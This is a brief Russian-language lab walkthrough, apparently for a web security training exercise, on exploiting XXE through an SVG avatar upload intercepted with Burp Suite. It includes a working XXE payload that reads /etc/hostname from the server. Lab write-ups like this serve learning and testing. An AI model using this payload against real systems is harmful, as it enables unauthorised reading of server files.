## Lab: Exploiting XXE via image file upload
1) Переходим на сайт задания и выбираем любую статью.
2) Заполняем комментарий(не важно как) и отправляем. Перехватим запрос через Burp Suite.
3) В значение поля для картинки вставляем:
```php
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
  </svg>
```
![](https://github.com/NaylyaZh99/hacking/blob/master/lab%20XXE/task4/image.png)

4) Возвращаемся на сайт и просматриваем загруженный нами аватар:

![](https://github.com/NaylyaZh99/hacking/blob/master/lab%20XXE/task4/image1.png)

Готово!
